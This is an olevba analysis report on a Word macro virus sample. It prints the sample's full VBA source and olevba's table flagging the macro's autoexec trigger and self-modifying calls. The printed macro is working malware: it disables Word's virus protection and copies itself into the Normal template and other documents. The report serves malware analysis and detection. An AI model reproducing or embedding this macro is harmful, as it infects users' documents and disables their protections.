olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.vw-9def0288e18fdf025114b4e117e00ec6273125f3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.vw-9def0288e18fdf025114b4e117e00ec6273125f3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub document_open(): Const nula = 0
Dim a, b, c, d: Set b = ThisDocument: Options.VirusProtection = nula
If b = ActiveDocument Then Set c = NormalTemplate Else Set c = ActiveDocument
d = b.VBProject.vbcomponents(1).codemodule.lines(1, _
b.VBProject.vbcomponents(1).codemodule.countoflines): a = Strings.LCase(d)
With c.VBProject.vbcomponents(1).codemodule
 If .lines(14, 1) <> "'string2" Then
  With c.VBProject.vbcomponents(1).codemodule
    .deletelines 1, c.VBProject.vbcomponents(1).codemodule.countoflines
    .insertlines 1, a
  End With
 End If
End With
End Sub
'string2







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

